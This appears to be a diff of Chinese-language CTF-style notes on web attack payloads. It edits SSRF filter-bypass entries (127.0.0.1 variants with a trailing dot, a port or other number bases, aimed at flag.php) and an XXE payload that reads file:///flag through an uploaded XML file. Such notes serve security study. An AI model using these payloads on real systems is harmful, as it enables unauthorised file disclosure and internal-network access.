@@ -246,18 +246,15 @@ proxy=http://127.1/flag.php
 ```
 
 ### SSRF-004
-> 将`127.0.0.1`进行转换，转换为其他进制的数从而绕过检测
-> 进制转换结果如下
+> 特征
 ```text
-0177.0.0.1 //八进制
-0x7f.0.0.1 //十六进制
-2130706433 //十进制
+proxy=http://127.0.0.1./flag.php 
 ```
 
 ### SSRF-005
 > 特征
 ```text
-proxy=http://127.0.0.1./flag.php 
+proxy=http://127.0.0.1:85/flag.php 
 ```
 
 ### SSRF-006
@@ -773,7 +770,8 @@ echo base64_encode(serialize(new Psr6Cache()));
 >
 > `网页访问/uploads/data.xml找到原本xml文本数据格式，将可以页面回显的标签修改成XXE-payload。上传 data2.xml 成功后，通过index?file=data2.xml`
 ```xml
-<?xml version="1.0" encoding="ISO-8859-1"?>
+
+<?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE class [
 <!ELEMENT class ANY >
 <!ENTITY xxe SYSTEM "file:///flag" >]>
